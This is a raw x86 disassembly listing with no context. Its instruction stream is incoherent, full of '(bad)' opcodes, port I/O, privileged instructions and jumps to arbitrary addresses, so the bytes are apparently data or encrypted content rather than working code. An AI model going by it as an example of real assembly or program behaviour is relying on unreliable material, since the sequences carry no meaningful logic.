  41c9c9:	jl     0x41c9fe
  41c9cb:	add    eax,0x5dd5e300
  41c9d0:	mov    al,ds:0x6a52ba80
  41c9d5:	mov    eax,ds:0xc22e77a2
  41c9da:	mov    edx,0x45fa72e3
  41c9df:	dec    ebx
  41c9e0:	mov    eax,0x673d2094
  41c9e5:	cli    
  41c9e6:	jg     0x41ca0c
  41c9e8:	addr16 retf 
  41c9ea:	pop    es
  41c9eb:	inc    ebp
  41c9ec:	sub    eax,0xa1ac3bdc
  41c9f1:	mov    ch,0x15
  41c9f3:	das    
  41c9f4:	aad    0xbf
  41c9f6:	or     ah,BYTE PTR [ebx+0x47]
  41c9f9:	jp     0x41c9eb
  41c9fb:	push   ds
  41c9fc:	and    al,0xb9
  41c9fe:	fmul   QWORD PTR [edi-0x72e48932]
  41ca04:	jle    0x41ca0b
  41ca06:	sub    ebx,DWORD PTR [esi]
  41ca08:	daa    
  41ca09:	mov    ebp,0x806dcefc
  41ca0e:	into   
  41ca0f:	jns    0x41ca8a
  41ca11:	out    dx,eax
  41ca12:	das    
  41ca13:	cmp    al,BYTE PTR [ebx+ebp*1]
  41ca16:	out    0xb8,al
  41ca18:	in     eax,0x33
  41ca1a:	in     al,0xab
  41ca1c:	mov    ah,0x20
  41ca1e:	enter  0x69a9,0x9
  41ca22:	inc    eax
  41ca23:	jns    0x41ca5f
  41ca25:	adc    al,0x1d
  41ca27:	sub    DWORD PTR [esi],ebx
  41ca29:	pushf  
  41ca2a:	sbb    edx,DWORD PTR [ebx]
  41ca2c:	dec    ebp
  41ca2d:	sub    BYTE PTR [eax],bh
  41ca2f:	in     al,0x85
  41ca31:	jo     0x41ca89
  41ca33:	fsubr  QWORD PTR [edx]
  41ca35:	rol    DWORD PTR [ebp-0x3b6d59e4],cl
  41ca3b:	jecxz  0x41ca59
  41ca3d:	and    ebp,edx
  41ca3f:	ds loop 0x41ca27
  41ca42:	lods   eax,DWORD PTR ds:[esi]
  41ca43:	adc    eax,0x78949896
  41ca48:	in     al,dx
  41ca49:	and    BYTE PTR [edi-0x19],bl
  41ca4c:	sbb    al,dh
  41ca4e:	(bad)  [eax+eiz*2-0xc4205f2]
  41ca55:	jecxz  0x41ca77
  41ca57:	push   ebx
  41ca58:	addr16 jo 0x41c9f2
  41ca5b:	inc    esi
  41ca5c:	loop   0x41ca25
  41ca5e:	mov    bh,0x50
  41ca60:	in     al,0x40
  41ca62:	mov    ecx,0x235c012d
  41ca67:	and    eax,0xc925d585
  41ca6c:	push   0xffffffb2
  41ca6e:	dec    eax
  41ca6f:	(bad)  
  41ca70:	cli    
  41ca71:	dec    ebp
  41ca72:	sahf   
  41ca73:	fwait
  41ca74:	mov    BYTE PTR [ebp+eax*4-0x57],bl
  41ca78:	jns    0x41ca90
  41ca7a:	jle    0x41ca61
  41ca7c:	sub    DWORD PTR [ebx-0x30e830e5],esp
  41ca82:	les    ebp,FWORD PTR [eax+esi*4-0x69cf569a]
  41ca89:	jb     0x41ca88
  41ca8b:	imul   edi,DWORD PTR [ebx],0x36837d96
  41ca91:	cmp    al,0xb
  41ca93:	lods   al,BYTE PTR ds:[esi]
  41ca94:	xchg   ebx,eax
  41ca95:	push   ds
  41ca96:	pop    edx
  41ca97:	hlt    
  41ca98:	int    0x4b
  41ca9a:	(bad)  
  41ca9c:	mov    ebx,0xfb59b7d9
  41caa1:	jbe    0x41ca4d
  41caa3:	adc    BYTE PTR [eax-0x57],dh
  41caa6:	rol    DWORD PTR [eax],cl
  41caa8:	jp     0x41cae9
  41caaa:	cmp    BYTE PTR cs:[edi],dl
  41caad:	das    
  41caae:	push   esi
  41caaf:	inc    ebx
  41cab0:	or     esp,DWORD PTR [ebp+0x34]
  41cab3:	xor    al,0x12
  41cab5:	mov    bh,0x90
  41cab7:	xlat   BYTE PTR ds:[ebx]
  41cab8:	inc    esi
  41cab9:	pusha  
  41caba:	mov    ecx,0x1b4e08d7
  41cabf:	and    eax,0xa64978a4
  41cac4:	cmp    al,0xb7
  41cac6:	les    edi,FWORD PTR [eax-0xc]
  41cac9:	dec    ecx
  41caca:	xchg   BYTE PTR [ecx],cl
  41cacc:	pop    ecx
  41cacd:	cmc    
  41cace:	jp     0x41cb3c
  41cad0:	add    ah,cl
  41cad2:	inc    ch
  41cad4:	pop    esp
  41cad5:	mov    eax,ds:0x29ed846e
  41cada:	sbb    ah,bl
  41cadc:	lods   eax,DWORD PTR ds:[esi]
  41cadd:	cli    
  41cade:	push   ss
  41cadf:	stos   BYTE PTR es:[edi],al
  41cae0:	imul   esi,DWORD PTR [esi-0x3c8b414],0xffffffc4
  41cae7:	fmulp  st(7),st
  41cae9:	je     0x41cb09
  41caeb:	xor    eax,0x114d291c
  41caf0:	push   ecx
  41caf1:	cld    
  41caf2:	inc    ecx
  41caf3:	pop    esp
  41caf4:	cdq    
  41caf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf6:	ficom  WORD PTR [edx]
  41caf8:	push   eax
  41caf9:	pop    ecx
  41cafa:	(bad)  
  41cafb:	scas   eax,DWORD PTR es:[edi]
  41cafc:	test   BYTE PTR [eax],bl
  41cafe:	enter  0x8c4c,0x19
  41cb02:	repnz mov al,ds:0xca0b035f
  41cb08:	xor    BYTE PTR [ebx-0x3a],bl
  41cb0b:	int    0xdf
  41cb0d:	xor    esi,DWORD PTR [ecx]
  41cb0f:	out    0x98,eax
  41cb11:	sbb    al,0xed
  41cb13:	into   
  41cb14:	scas   eax,DWORD PTR es:[edi]
  41cb15:	icebp  
  41cb16:	xor    ah,BYTE PTR [esi+0x1a55fd68]
  41cb1c:	lods   eax,DWORD PTR ds:[esi]
  41cb1d:	sbb    BYTE PTR [ebx-0x50],bl
  41cb20:	shr    DWORD PTR [ebx-0xc],0xf
  41cb24:	stc    
  41cb25:	aam    0xec
  41cb27:	jecxz  0x41cb05
  41cb29:	in     al,dx
  41cb2a:	jp     0x41cb9f
  41cb2c:	lock sbb eax,0xd2625415
  41cb32:	dec    edx
  41cb33:	xlat   BYTE PTR ds:[ebx]
  41cb34:	retf   
  41cb35:	xor    dh,bh
  41cb37:	adc    DWORD PTR [edi-0x55],eax
  41cb3a:	mov    DWORD PTR [ebp-0x2615fbc6],0x8a93130f
  41cb44:	pop    es
  41cb45:	mov    al,ds:0xe7aa50a3
  41cb4a:	loop   0x41cb0a
  41cb4c:	xchg   ecx,eax
  41cb4d:	loop   0x41cadb
  41cb4f:	je     0x41cb6e
  41cb51:	push   ss
  41cb52:	cmp    bh,al
  41cb54:	xchg   edx,eax
  41cb55:	cmp    edx,DWORD PTR [ecx]
  41cb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb58:	xchg   ebp,eax
  41cb59:	sub    eax,0x6fc27dc0
  41cb5e:	(bad)  
  41cb5f:	push   ds
  41cb60:	daa    
  41cb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb62:	pop    esp
  41cb63:	mov    dh,0x2
  41cb65:	sahf   
  41cb66:	pushf  
  41cb67:	mov    ebx,DWORD PTR [eax]
  41cb69:	xor    al,0x46
  41cb6b:	jmp    0x41cafe
  41cb6d:	stc    
  41cb6e:	cs jecxz 0x41cb4f
  41cb71:	hlt    
  41cb72:	fwait
  41cb73:	jbe    0x41cb7a
  41cb75:	jb     0x41cb99
  41cb77:	ret    
  41cb78:	jae    0x41cbcf
  41cb7a:	adc    al,0x3f
  41cb7c:	lahf   
  41cb7d:	not    ebx
  41cb7f:	std    
  41cb80:	dec    edi
  41cb81:	clc    
  41cb82:	dec    edi
  41cb83:	push   edx
  41cb84:	pop    edx
  41cb85:	jbe    0x41cbce
  41cb87:	or     ah,BYTE PTR [ecx-0x3b61465a]
  41cb8d:	ja     0x41cb2b
  41cb8f:	push   ebp
  41cb90:	(bad)  
  41cb92:	pop    esi
  41cb93:	mov    ?,WORD PTR [edi-0x2104db51]
  41cb99:	xchg   edi,eax
  41cb9a:	jmp    FWORD PTR [ebp+edx*2-0x17a34358]
  41cba1:	xor    al,0x7a
  41cba3:	fld    QWORD PTR [ecx-0x774dea8e]
  41cba9:	ds in  al,0xd9
  41cbac:	in     eax,dx
  41cbad:	and    DWORD PTR ds:0x1ec08517,0x16dfef66
  41cbb7:	popa   
  41cbb8:	test   DWORD PTR es:[esi-0x2e],edx
  41cbbc:	arpl   WORD PTR [ebx],dx
  41cbbe:	cmp    DWORD PTR [edi+0xd2f1167],edi
  41cbc4:	push   ebp
  41cbc5:	mov    edx,0x612c91a7
  41cbca:	lods   al,BYTE PTR ds:[esi]
  41cbcb:	or     cl,BYTE PTR [ecx+0x2c007acb]
  41cbd1:	xchg   edx,eax
  41cbd2:	sbb    al,0x3
  41cbd4:	mov    eax,ds:0x8e6ccef5
  41cbd9:	pusha  
  41cbda:	cmp    eax,0x5d149ca8
  41cbdf:	mov    ebp,0xe01d7ecd
  41cbe4:	jmp    0x41cbb1
  41cbe6:	dec    edx
  41cbe7:	frstor [ecx+0x59a7a48]
  41cbed:	fs pop ds
  41cbef:	pop    eax
  41cbf0:	cmp    al,0x6e
  41cbf2:	push   esp
  41cbf3:	xor    ecx,edx
  41cbf5:	cmp    al,BYTE PTR [edi-0x28]
  41cbf8:	test   eax,0xd0f7eb6e
  41cbfd:	out    dx,eax
  41cbfe:	addr16 (bad) 
  41cc00:	test   DWORD PTR ds:0x67109825,0x92a5d018
  41cc0a:	fdivr  QWORD PTR [edx+0x77429465]
  41cc10:	cli    
  41cc11:	push   esp
  41cc12:	cmp    eax,DWORD PTR [eax-0x7e]
  41cc15:	add    ch,BYTE PTR [ecx+edi*4-0x2ca1c6c3]
  41cc1c:	xor    BYTE PTR [ecx-0x1b],dl
  41cc1f:	push   esi
  41cc20:	loop   0x41cc24
  41cc22:	popa   
  41cc23:	je     0x41cc45
  41cc25:	mov    edi,DWORD PTR ds:0x4e4d62f1
  41cc2b:	bound  esp,QWORD PTR [edx]
  41cc2d:	inc    ecx
  41cc2e:	stc    
  41cc2f:	jl     0x41cc75
  41cc31:	mov    ds:0xda429b94,eax
  41cc36:	out    0x4a,eax
  41cc38:	dec    esi
  41cc39:	dec    ebx
  41cc3a:	clc    
  41cc3b:	pop    es
  41cc3c:	ds xchg esi,eax
  41cc3e:	dec    esp
  41cc3f:	lock inc ecx
  41cc41:	cmp    BYTE PTR [ebx+ecx*4],0xc8
  41cc45:	inc    ebp
  41cc46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc47:	fiadd  DWORD PTR [edx]
  41cc49:	sbb    edi,ebx
  41cc4b:	sub    BYTE PTR [esi+0x48],cl
  41cc4e:	jnp    0x41cc86
  41cc50:	jb     0x41cc77
  41cc52:	scas   eax,DWORD PTR es:[edi]
  41cc53:	mov    ?,ebp
  41cc55:	mov    esi,0x5facc497
  41cc5a:	dec    eax
  41cc5b:	push   edx
  41cc5c:	xchg   esi,eax
  41cc5d:	das    
  41cc5e:	aam    0x6a
  41cc60:	arpl   WORD PTR [ebp+ecx*4+0x7464019b],bp
  41cc67:	pop    eax
  41cc68:	aas    
  41cc69:	mov    bl,0xd9
  41cc6b:	mov    DWORD PTR [ecx],ebp
  41cc6d:	loop   0x41cc48
  41cc6f:	jne    0x41cc51
  41cc71:	cld    
  41cc72:	mov    ds:0x21728036,eax
  41cc77:	imul   edi,DWORD PTR [edx+0x48],0xffffff9e
  41cc7b:	fldcw  WORD PTR [edx+0x56273fc0]
  41cc81:	aaa    
  41cc82:	mov    dl,0x50
  41cc84:	push   cs
  41cc85:	adc    ebp,DWORD PTR [esi+0x173a4251]
  41cc8b:	pushf  
  41cc8c:	mov    ds:0x3167fbca,eax
  41cc91:	rcr    ah,0xb
  41cc94:	xor    eax,DWORD PTR [ecx+eax*1+0x6f]
  41cc98:	mov    al,BYTE PTR [edx+0x58]
  41cc9b:	add    al,0x85
  41cc9d:	xchg   bh,bl
  41cc9f:	repnz clc 
  41cca1:	call   0xb02754a
  41cca6:	add    DWORD PTR [ecx+edx*1],esi
  41cca9:	cmp    eax,0xe1b3fb9a
  41ccae:	addr16 cmc 
  41ccb0:	pop    esp
  41ccb1:	in     al,0xa1
  41ccb3:	and    ebx,0x35
  41ccb6:	lock in eax,0xec
  41ccb9:	fsubr  QWORD PTR [edx+0x5f8a7cdf]
  41ccbf:	mov    ebx,0x48b02a0c
  41ccc4:	repz or BYTE PTR [ebx],ah
  41ccc7:	aad    0x3a
  41ccc9:	fisttp DWORD PTR [eax+eax*4-0x29d21630]
  41ccd0:	push   0x212d0311
  41ccd5:	fild   QWORD PTR [esi]
  41ccd8:	rcr    BYTE PTR [ebp-0x59],0xdc
  41ccdc:	aam    0x81
  41ccde:	mov    bh,0xd2
  41cce0:	js     0x41cd4f
  41cce2:	or     DWORD PTR [eax-0x2b],ebp
  41cce5:	call   0x962c:0x87e1d48c
  41ccec:	popa   
  41cced:	adc    bh,BYTE PTR [esi+eax*8-0x17]
  41ccf1:	(bad)  
  41ccf2:	in     al,dx
  41ccf3:	mov    dl,0xc
  41ccf5:	xor    ebx,DWORD PTR [ebx]
  41ccf7:	pop    ecx
  41ccf8:	imul   BYTE PTR [esi-0x4d]
  41ccfb:	imul   ebx,DWORD PTR [edx+0x0],0xffffffca
  41ccff:	rcl    DWORD PTR [ecx],0x92
  41cd02:	rcl    DWORD PTR [esi-0x5f],cl
  41cd05:	gs xchg ecx,eax
  41cd07:	sbb    eax,0x1b31cc3e
  41cd0c:	lds    eax,FWORD PTR [eax-0xd]
  41cd0f:	mov    BYTE PTR [ecx+edx*4],dh
  41cd12:	aaa    
  41cd13:	icebp  
  41cd14:	adc    eax,0x4829c17a
  41cd19:	test   BYTE PTR [ebx-0x55],al
  41cd1c:	fwait
  41cd1d:	dec    esp
  41cd1e:	cmp    DWORD PTR [ecx-0x6f],edx
  41cd21:	push   esi
  41cd22:	add    DWORD PTR [ecx+0x6f0dc349],esp
  41cd28:	mov    dl,0xe7
  41cd2a:	mov    bl,0x9
  41cd2c:	cmp    BYTE PTR [edx+ecx*1+0x47b73b94],bh
  41cd33:	push   edx
  41cd34:	sbb    ebx,DWORD PTR [edi]
  41cd36:	out    0x6f,al
  41cd38:	adc    BYTE PTR [ebx-0x4581c74b],0x61
  41cd3f:	xchg   esi,eax
  41cd40:	adc    dh,BYTE PTR [edx]
  41cd42:	sbb    cl,BYTE PTR [ecx-0x37]
  41cd45:	pop    edx
  41cd46:	hlt    
  41cd47:	xor    BYTE PTR [ecx+0x229b422d],ch
  41cd4d:	out    dx,eax
  41cd4e:	ins    DWORD PTR es:[edi],dx
  41cd4f:	inc    edx
  41cd50:	add    al,0x92
  41cd52:	nop
  41cd53:	rol    DWORD PTR [esi+0x6b],cl
  41cd56:	xchg   edx,eax
  41cd57:	mov    ebx,0x7b414d98
  41cd5c:	pop    esi
  41cd5d:	pushf  
  41cd5e:	push   es
  41cd5f:	shr    DWORD PTR [edi],1
  41cd61:	mov    ecx,0x58a88ff5
  41cd66:	fwait
  41cd67:	mov    dl,0x2f
  41cd69:	addr16 daa 
  41cd6b:	mov    DWORD PTR [edx],esp
  41cd6d:	inc    ebp
  41cd6e:	pop    esp
  41cd6f:	and    al,cl
  41cd71:	outs   dx,DWORD PTR ds:[esi]
  41cd72:	call   0xdb8fb97a
  41cd77:	aas    
  41cd78:	cmp    BYTE PTR [ebp+0x22a9df06],dl
  41cd7e:	or     DWORD PTR [edi-0x286d9cbd],edx
  41cd84:	out    0x40,eax
  41cd86:	and    eax,0x3580767
  41cd8b:	sbb    BYTE PTR [ecx+0x288b32eb],0xac
  41cd92:	or     BYTE PTR [ebx+0x682b7005],0xbe
  41cd99:	xchg   esp,eax
  41cd9a:	aam    0xaa
  41cd9c:	je     0x41cd68
  41cd9e:	mov    ecx,0x3fc2ffdb
  41cda3:	in     al,dx
  41cda4:	ror    BYTE PTR [esi],0x24
  41cda7:	adc    al,0x5a
  41cda9:	stos   DWORD PTR es:[edi],eax
  41cdaa:	dec    ebx
  41cdab:	les    ecx,FWORD PTR ds:0x1b64ec29
  41cdb1:	popf   
  41cdb2:	scas   eax,DWORD PTR es:[edi]
  41cdb3:	cmp    ebp,DWORD PTR [edi-0x5d43a9f1]
  41cdb9:	jne    0x41cdef
  41cdbb:	hlt    
  41cdbc:	inc    esp
  41cdbd:	out    0x58,eax
  41cdbf:	jno    0x41cdcf
  41cdc1:	push   ebx
  41cdc2:	sbb    esp,DWORD PTR [ebp+0x770c6aa]
  41cdc8:	jb     0x41cd68
  41cdca:	retf   
  41cdcb:	jae    0x41ce34
  41cdcd:	shr    BYTE PTR [edx+0x74c86db5],cl
  41cdd3:	adc    BYTE PTR [edi-0x73dc3403],dh
  41cdd9:	mov    bl,0xae
  41cddb:	mov    ds:0x607ee0fc,eax
  41cde0:	sub    BYTE PTR [ebp-0x6eefbe31],bh
  41cde6:	ins    DWORD PTR es:[edi],dx
  41cde7:	adc    DWORD PTR [eax],esp
  41cde9:	in     al,dx
  41cdea:	aaa    
  41cdeb:	pop    edi
  41cdec:	out    0x92,eax
  41cdee:	adc    dl,bl
  41cdf0:	xor    al,0x14
  41cdf2:	jg     0x41cdf9
  41cdf4:	iret   
  41cdf5:	aaa    
  41cdf6:	sub    al,0x2f
  41cdf8:	and    DWORD PTR [esi],ebp
  41cdfa:	sbb    ah,BYTE PTR [edx+eiz*2-0x62]
  41cdfe:	jecxz  0x41ce27
  41ce00:	jae    0x41ce12
  41ce02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce03:	rcl    edx,cl
  41ce05:	sub    al,0xf1
  41ce07:	and    eax,0xf70b7ccd
  41ce0c:	xchg   ebp,eax
  41ce0d:	jmp    0x41cdbc
  41ce0f:	cld    
  41ce10:	cld    
  41ce11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce12:	data16 mov ?,WORD PTR [ebx+edi*2+0x6abae7e3]
  41ce1a:	cmp    al,BYTE PTR [eax+0x4e]
  41ce1d:	das    
  41ce1e:	and    eax,0x31efc0cf
  41ce23:	nop
  41ce24:	xor    eax,esi
  41ce26:	out    0xe8,al
  41ce28:	jo     0x41cea4
  41ce2a:	mov    ch,0xbf
  41ce2c:	push   ebp
  41ce2d:	sbb    DWORD PTR [esi],eax
  41ce2f:	mov    esi,0x555e5c68
  41ce34:	cmp    esi,edx
  41ce36:	mov    esi,0x7862c735
  41ce3b:	mov    ecx,?
  41ce3d:	xor    ebp,DWORD PTR [ebx]
  41ce3f:	in     eax,0x56
  41ce41:	xor    bl,BYTE PTR [edx+ebx*1-0xaec2ff7]
  41ce48:	mov    WORD PTR [ebx-0x1da488ab],?
  41ce4e:	sbb    eax,0xcafb5d9
  41ce53:	and    al,0x4b
  41ce55:	fidiv  DWORD PTR [edi+eiz*4+0x30635ae3]
  41ce5c:	jns    0x41cea6
  41ce5e:	adc    dl,BYTE PTR [edi+0x66efa3c6]
  41ce64:	add    DWORD PTR [edi-0x1b],0xffffff8e
  41ce68:	xchg   ebx,eax
  41ce69:	gs jl  0x41ce6f
  41ce6c:	xchg   edi,eax
  41ce6d:	lea    eax,[ebx]
  41ce6f:	pop    edx
  41ce70:	lds    esp,FWORD PTR [ebx-0x51]
  41ce73:	add    al,0xf3
  41ce75:	cmp    edx,DWORD PTR [ebx-0x79]
  41ce78:	pop    es
  41ce79:	cli    
  41ce7a:	pop    eax
  41ce7b:	push   esp
  41ce7c:	cmp    eax,0xbe00641e
  41ce81:	fcom   DWORD PTR [edi+0x22]
  41ce84:	add    eax,0x8ce3565b
  41ce89:	push   0x21b1f316
  41ce8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce8f:	dec    ecx
  41ce90:	and    edx,ebp
  41ce92:	lahf   
  41ce93:	mov    al,0x34
  41ce95:	adc    BYTE PTR [edi],dl
  41ce97:	(bad)  
  41ce98:	out    dx,eax
  41ce99:	sbb    BYTE PTR [edx+edx*4+0x369e2b12],bl
  41cea0:	sbb    al,0x18
  41cea2:	cld    
  41cea3:	dec    esp
  41cea4:	sub    DWORD PTR [ebp-0xb8c223],ebp
  41ceaa:	push   esi
  41ceab:	mov    dl,0xb9
  41cead:	push   0x638b8cf4
  41ceb2:	test   eax,0x3dcea44d
  41ceb7:	add    BYTE PTR [ebp+ecx*4+0x45],dl
  41cebb:	paddsw mm0,QWORD PTR ds:0xbc8f6385
  41cec2:	jmp    0x41ce57
  41cec4:	cmp    esp,DWORD PTR [esi-0x15]
  41cec7:	mov    BYTE PTR [ecx+edx*8-0x4a9b6211],bh
  41cece:	mov    edi,0x573ccf76
  41ced3:	ret    
  41ced4:	retf   
  41ced5:	call   0x60f74f28
  41ceda:	cmp    bl,BYTE PTR [ebx]
  41cedc:	or     BYTE PTR [ecx-0x23e86810],ch
  41cee2:	test   DWORD PTR [ebp-0x1c],esi
  41cee5:	int    0xa8
  41cee7:	pop    edi
  41cee8:	fmul   DWORD PTR [ecx+0x71]
  41ceeb:	sbb    eax,0xb93171d5
  41cef0:	and    BYTE PTR [ebp+0x7f],0x9d
  41cef4:	lods   eax,DWORD PTR ds:[esi]
  41cef5:	and    al,0xbf
  41cef7:	pop    ebx
  41cef8:	in     eax,dx
  41cef9:	xlat   BYTE PTR ds:[ebx]
  41cefa:	mov    ebx,0xe61d1ce5
  41ceff:	push   eax
  41cf00:	jne    0x41cf30
  41cf02:	sub    DWORD PTR [ebx],esp
  41cf04:	push   ebx
  41cf05:	lock push es
  41cf07:	addr16 push edx
  41cf09:	fsubp  st(0),st
  41cf0b:	jae    0x41cf1d
  41cf0d:	ficom  WORD PTR [edx]
  41cf0f:	xchg   ebp,eax
  41cf10:	mov    al,ds:0x7df7c2fa
  41cf15:	retf   
  41cf16:	pop    ebp
  41cf17:	scas   al,BYTE PTR es:[edi]
  41cf18:	sub    bh,BYTE PTR [ebp+esi*4+0x67]
  41cf1c:	mov    esi,DWORD PTR [ebp-0x40]
  41cf1f:	fidivr WORD PTR ds:0x8bdb7d0a
  41cf25:	mov    es,WORD PTR [esi+ecx*2-0x3e89514d]
  41cf2c:	cmp    eax,0x7f420f9f
  41cf31:	outs   dx,BYTE PTR ds:[esi]
  41cf32:	ja     0x41cecb
  41cf34:	mov    dh,0xa1
  41cf36:	sbb    ebp,DWORD PTR [esi]
  41cf38:	repnz jecxz 0x41cf87
  41cf3b:	add    al,0x53
  41cf3d:	add    cl,BYTE PTR [ebx+0x68]
  41cf40:	loope  0x41cf77
  41cf42:	lods   eax,DWORD PTR ds:[esi]
  41cf43:	mov    ecx,DWORD PTR [esi+0xbf108fa]
  41cf49:	iret   
  41cf4a:	js     0x41cfa4
  41cf4c:	cli    
  41cf4d:	jnp    0x41cf50
  41cf4f:	sub    BYTE PTR [edx],cl
  41cf51:	pop    ebx
  41cf52:	pop    ecx
  41cf53:	jno    0x41cf9f
  41cf55:	mov    BYTE PTR [ebp+0x7d55b422],bl
  41cf5b:	imul   edi,DWORD PTR [edi-0x4],0xe75bfea7
  41cf62:	pushf  
  41cf63:	in     eax,0x89
  41cf65:	cmp    DWORD PTR [eax+0x6],edi
  41cf68:	jb     0x41cfde
  41cf6a:	lock adc al,0xe1
  41cf6d:	test   BYTE PTR [ebp*8-0x53a2ce74],bl
  41cf74:	aad    0x7a
  41cf76:	cmp    ebp,DWORD PTR cs:[edx]
  41cf79:	mov    edx,0xc23a1aad
  41cf7e:	aad    0x25
  41cf80:	cmp    BYTE PTR ds:0x197ec417,bh
  41cf86:	mov    esp,ebx
  41cf88:	sbb    BYTE PTR [ecx+ebx*2-0x7f],dl
  41cf8c:	enter  0xd256,0xc2
  41cf90:	aad    0x7f
  41cf92:	out    dx,al
  41cf93:	sahf   
  41cf94:	leave  
  41cf95:	pop    esp
  41cf96:	and    eax,0x38efc97b
  41cf9b:	fidivr WORD PTR [edx+0x19d82c12]
  41cfa1:	cs inc eax
  41cfa3:	xor    BYTE PTR [ecx+eax*2],ah
  41cfa6:	test   eax,0xe2f2f099
  41cfab:	retf   
  41cfac:	jnp    0x41cfaa
  41cfae:	inc    esi
  41cfaf:	pop    ecx
  41cfb0:	mov    eax,0x3500f9d5
  41cfb5:	iret   
  41cfb6:	lods   eax,DWORD PTR ds:[esi]
  41cfb7:	aam    0xd4
  41cfb9:	ror    ch,cl
  41cfbb:	aam    0xcf
  41cfbd:	push   ecx
  41cfbe:	gs pop es
  41cfc0:	loope  0x41cf5d
  41cfc2:	into   
  41cfc3:	jo     0x41d02b
  41cfc5:	sub    al,0x92
  41cfc7:	mov    BYTE PTR [eax-0xf5a4284],dh
  41cfcd:	ror    DWORD PTR [edi-0x32],0x46
  41cfd1:	mov    esi,0x30cb6c65
  41cfd6:	(bad)  
  41cfd7:	scas   eax,DWORD PTR es:[edi]
  41cfd8:	loop   0x41cfd3
  41cfda:	sahf   
  41cfdb:	push   edi
  41cfdc:	jnp    0x41cfcd
  41cfde:	in     al,0x92
  41cfe0:	or     al,cl
  41cfe2:	sub    esi,ecx
  41cfe4:	push   ds
  41cfe5:	stc    
  41cfe6:	xor    al,0x1b
  41cfe8:	aas    
  41cfe9:	dec    esi
  41cfea:	pop    ebp
  41cfeb:	sbb    BYTE PTR [eax+ebx*8-0x451ac079],0x7d
  41cff3:	jns    0x41d046
  41cff5:	xor    eax,0x8ab6f2b7
  41cffa:	sti    
  41cffb:	or     BYTE PTR [edx-0x43f2e4d2],ah
  41d001:	aad    0xd9
  41d003:	iret   
  41d004:	xor    ah,ah
  41d006:	cmp    DWORD PTR [ecx+0x2060e1d6],0xffffffd1
  41d00d:	push   ebp
  41d00e:	or     BYTE PTR ds:0x84e29420,cl
  41d014:	mov    ecx,0xe8690da5
  41d019:	jb     0x41cfb2
  41d01b:	cmc    
  41d01c:	xor    ebx,DWORD PTR [ecx]
  41d01e:	fdiv   DWORD PTR [ecx]
  41d020:	adc    ch,0xd8
  41d023:	inc    edx
  41d024:	push   esi
  41d025:	pop    ds
  41d026:	jno    0x41cfdf
  41d028:	loopne 0x41d09f
  41d02a:	idiv   DWORD PTR [eax+0x5f096d3c]
  41d030:	mov    dh,0xfd
  41d032:	pop    edx
  41d033:	pop    esi
  41d034:	inc    ecx
  41d035:	jl     0x41cfd4
  41d037:	or     DWORD PTR [eax+0x42],esp
  41d03a:	pop    ds
  41d03b:	or     eax,0x87ec3e93
  41d040:	(bad)  
  41d042:	push   ss
  41d043:	push   cs
  41d044:	fcomi  st,st(0)
  41d046:	in     al,0xc7
  41d048:	xor    dh,BYTE PTR [ebp+ecx*4-0x2e999e06]
  41d04f:	push   ds
  41d050:	int3   
  41d051:	or     eax,0x1e8d18b5
  41d056:	inc    eax
  41d057:	aas    
  41d058:	or     edi,esi
  41d05a:	inc    esp
  41d05b:	cmc    
  41d05c:	xchg   edx,eax
  41d05d:	retf   
  41d05e:	cmp    BYTE PTR ds:0x40f26967,bl
  41d064:	xchg   edx,eax
  41d065:	push   0x327fa073
  41d06a:	adc    al,0xd5
  41d06c:	mov    edx,0xe49521fc
  41d071:	mov    esp,ecx
  41d073:	addr16 rcr edx,0x25
  41d077:	aam    0xf2
  41d079:	mov    esp,0x712a3d6b
  41d07e:	and    DWORD PTR ss:[ebx],ebp
  41d081:	bound  esp,QWORD PTR [ecx]
  41d083:	mov    bh,0x50
  41d085:	jne    0x41d042
  41d087:	jns    0x41d00b
  41d089:	call   0xe9f14350
  41d08e:	mov    cl,0xbe
  41d090:	sbb    DWORD PTR ds:0xcd41d48,ebx
  41d096:	nop
  41d097:	xchg   ebp,eax
  41d098:	jp     0x41d030
  41d09a:	test   edi,ecx
  41d09c:	mov    DWORD PTR [edx+0x28877db1],ebx
  41d0a2:	bound  eax,QWORD PTR [ebp-0x7c1002fb]
  41d0a8:	rcr    esp,cl
  41d0aa:	in     eax,0xa0
  41d0ac:	aas    
  41d0ad:	pop    eax
  41d0ae:	mov    esi,0xe6c1ffaa
  41d0b3:	test   eax,0xd2b87e99
  41d0b8:	stc    
  41d0b9:	mov    edi,0x5577fd6b
  41d0be:	loop   0x41d054
  41d0c0:	dec    ecx
  41d0c1:	jmp    0xb9215409
  41d0c6:	(bad)  [ecx-0x102060f8]
  41d0cc:	or     BYTE PTR ds:[eax+0x488b036d],cl
  41d0d3:	mov    bl,0xfe
  41d0d5:	jae    0x41d11f
  41d0d7:	pop    edi
  41d0d8:	inc    ebp
  41d0d9:	retf   
  41d0da:	jl     0x41d0ce
  41d0dc:	xor    BYTE PTR [ebp+0x63],0xf9
  41d0e0:	fwait
  41d0e1:	stos   DWORD PTR es:[edi],eax
  41d0e2:	(bad)  
  41d0e3:	jbe    0x41d109
  41d0e5:	div    ebx
  41d0e7:	gs out dx,eax
  41d0e9:	lahf   
  41d0ea:	xor    ebx,ecx
  41d0ec:	mov    ebp,0xc423d818
  41d0f1:	test   al,0xfc
  41d0f3:	minpd  xmm3,XMMWORD PTR [ecx-0x41230ef0]
  41d0fb:	cli    
  41d0fc:	rcl    BYTE PTR [ebp+0x78bf1401],cl
  41d102:	ss jbe 0x41d09f
  41d105:	loope  0x41d118
  41d107:	push   ebx
  41d108:	(bad)  
  41d109:	xchg   ebx,eax
  41d10a:	xchg   esp,eax
  41d10b:	mov    ebx,0xc91de5cc
  41d110:	scas   eax,DWORD PTR es:[edi]
  41d111:	cwde   
  41d112:	imul   esp,DWORD PTR [ebp-0x32662459],0x5d99e85a
  41d11c:	cmp    cl,bh
  41d11e:	(bad)
  41d121:	loopne 0x41d121
  41d123:	mov    esi,0x5cb9d83b
  41d128:	push   esi
  41d129:	(bad)  
  41d12a:	jmp    0xbf66efc9
  41d12f:	jo     0x41d1a2
  41d131:	rol    bl,0x6b
  41d134:	in     al,dx
  41d135:	fistp  DWORD PTR [esi]
